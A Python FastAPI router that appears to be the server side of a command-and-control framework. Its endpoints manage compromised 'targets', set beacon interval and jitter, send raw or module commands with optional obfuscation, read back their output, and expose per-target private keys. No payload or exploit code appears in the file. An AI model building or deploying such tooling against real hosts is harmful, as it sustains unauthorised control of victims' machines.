from typing import Any

from fastapi import APIRouter, Depends, HTTPException, status
from pydantic import BaseModel
from sqlmodel import Session, select

from backend.classes.database import get_session
from backend.classes.auth import get_current_user
from backend.classes.command_processor import CommandProcessor
from backend.models.target import Target
from backend.models.command import Command
from backend.models.key_store import KeyStore
from backend.models.user import User

router = APIRouter(prefix="/targets", tags=["targets"])


class CommandRequest(BaseModel):
    command: str
    obfuscate: bool = False


class ModuleCommandRequest(BaseModel):
    module_name: str
    obfuscate: bool = False
    params: dict[str, Any] = {}


class CommandResultResponse(BaseModel):
    id: str
    target_id: str
    command: str
    original_command: str = ""
    output: str
    status: str
    module_name: str = ""


class TargetResponse(BaseModel):
    id: str
    hostname: str
    ip_address: str
    status: str
    beacon_interval: int = 60
    beacon_jitter: float = 0.3


class StatusRequest(BaseModel):
    status: str  # "active" | "inactive"


class BeaconConfigRequest(BaseModel):
    beacon_interval: int = 60    # seconds
    beacon_jitter: float = 0.3   # 0.0 – 1.0


class KeyStoreResponse(BaseModel):
    id: str
    target_id: str
    public_key_pem: str
    private_key_pem: str
    created_at: str


@router.get("", response_model=list[TargetResponse])
def list_targets(
    session: Session = Depends(get_session),
    _user: User = Depends(get_current_user),
):
    targets = session.exec(select(Target)).all()
    return targets


@router.get("/{target_id}", response_model=TargetResponse)
def get_target(
    target_id: str,
    session: Session = Depends(get_session),
    _user: User = Depends(get_current_user),
):
    target = session.get(Target, target_id)
    if not target:
        raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="Target not found")
    return target


@router.patch("/{target_id}/beacon", response_model=TargetResponse)
def set_beacon_config(
    target_id: str,
    body: BeaconConfigRequest,
    session: Session = Depends(get_session),
    _user: User = Depends(get_current_user),
):
    target = session.get(Target, target_id)
    if not target:
        raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="Target not found")

    if not (0.0 <= body.beacon_jitter <= 1.0):
        raise HTTPException(
            status_code=status.HTTP_422_UNPROCESSABLE_ENTITY,
            detail="beacon_jitter must be between 0.0 and 1.0",
        )
    if body.beacon_interval < 1:
        raise HTTPException(
            status_code=status.HTTP_422_UNPROCESSABLE_ENTITY,
            detail="beacon_interval must be at least 1 second",
        )

    target.beacon_interval = body.beacon_interval
    target.beacon_jitter = body.beacon_jitter
    session.add(target)
    session.commit()
    session.refresh(target)
    return target


@router.patch("/{target_id}/status", response_model=TargetResponse)
def set_target_status(
    target_id: str,
    body: StatusRequest,
    session: Session = Depends(get_session),
    _user: User = Depends(get_current_user),
):
    target = session.get(Target, target_id)
    if not target:
        raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="Target not found")

    if body.status not in ("active", "inactive"):
        raise HTTPException(
            status_code=status.HTTP_422_UNPROCESSABLE_ENTITY,
            detail='status must be "active" or "inactive"',
        )

    target.status = body.status
    session.add(target)
    session.commit()
    session.refresh(target)
    return target


@router.post("/{target_id}/command", response_model=CommandResultResponse)
def send_command(
    target_id: str,
    body: CommandRequest,
    session: Session = Depends(get_session),
    _user: User = Depends(get_current_user),
):
    target = session.get(Target, target_id)
    if not target:
        raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="Target not found")

    cmd = CommandProcessor.process_raw(session, target, body.command, body.obfuscate)
    session.commit()
    session.refresh(cmd)
    return cmd


@router.post("/{target_id}/module", response_model=CommandResultResponse)
def send_module_command(
    target_id: str,
    body: ModuleCommandRequest,
    session: Session = Depends(get_session),
    _user: User = Depends(get_current_user),
):
    target = session.get(Target, target_id)
    if not target:
        raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="Target not found")

    try:
        cmd = CommandProcessor.process(
            session, target, body.module_name, body.obfuscate, **body.params
        )
    except ValueError as e:
        raise HTTPException(status_code=status.HTTP_400_BAD_REQUEST, detail=str(e))

    session.commit()
    session.refresh(cmd)
    return cmd


@router.get("/{target_id}/keys", response_model=list[KeyStoreResponse])
def get_target_keys(
    target_id: str,
    session: Session = Depends(get_session),
    _user: User = Depends(get_current_user),
):
    target = session.get(Target, target_id)
    if not target:
        raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="Target not found")

    keys = session.exec(select(KeyStore).where(KeyStore.target_id == target_id)).all()
    return [
        KeyStoreResponse(
            id=k.id,
            target_id=k.target_id,
            public_key_pem=k.public_key_pem,
            private_key_pem=k.private_key_pem,
            created_at=k.created_at.isoformat(),
        )
        for k in keys
    ]


@router.get("/{target_id}/commands", response_model=list[CommandResultResponse])
def list_commands(
    target_id: str,
    session: Session = Depends(get_session),
    _user: User = Depends(get_current_user),
):
    target = session.get(Target, target_id)
    if not target:
        raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="Target not found")

    cmds = session.exec(
        select(Command)
        .where(Command.target_id == target_id)
        .order_by(Command.created_at.desc())  # type: ignore[union-attr]
    ).all()
    return cmds


@router.post("/{target_id}/command/{command_id}", response_model=CommandResultResponse)
def get_command_result(
    target_id: str,
    command_id: str,
    session: Session = Depends(get_session),
    _user: User = Depends(get_current_user),
):
    cmd = session.exec(
        select(Command).where(Command.id == command_id, Command.target_id == target_id)
    ).first()
    if not cmd:
        raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="Command not found")
    return cmd
